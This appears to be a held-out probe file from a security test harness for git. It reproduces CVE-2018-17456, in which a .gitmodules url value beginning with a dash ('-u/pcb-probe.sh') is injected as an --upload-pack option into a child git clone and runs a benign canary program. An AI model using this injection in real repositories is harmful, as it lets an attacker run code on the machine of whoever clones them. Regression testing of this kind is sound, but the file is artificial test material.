#!/usr/bin/env python3
"""[HELD-OUT] CVE-2018-17456 residual — leading-dash `url` value in a submodule.

The SAME class as CVE-2017-1000117 (leading-dash submodule value -> child argv),
but the option-injection is against the child `git clone` ITSELF rather than the
spawned ssh. The `.gitmodules` `url` begins with '-', so when submodule--helper
runs `git clone <url> <path>` the value is parsed as an option:
`-u/pcb-probe.sh` == `--upload-pack=/pcb-probe.sh`. A ':' in the submodule path
(`sm:sm`) makes git route the positional through the upload-pack transport, so the
override program (the benign canary) is executed.

Contract: reaches the canary on V1 (git 2.14.1) — the CVE-2017-1000117 fix only
guarded connect.c (ssh host), NOT the argv of the child `git clone`, so this
residual bypasses it. BLOCKED on V2 (git 2.19.1), whose submodule--helper.c fix
inserts `--` before <url>/<path> ("ignoring '...url' which may be interpreted as
a command-line option"). This is the known incomplete-fix residual; held out.
"""
from __future__ import annotations

# url value = "-u/pcb-probe.sh" -> --upload-pack override injected into git clone.
URL = "-u/pcb-probe.sh"
SMPATH = "sm:sm"


def candidate() -> dict:
    return {"probe_id": "cve-2018-17456-url-value-dash", "url": URL, "path": SMPATH}


if __name__ == "__main__":
    c = candidate()
    print(c["url"], c["path"])
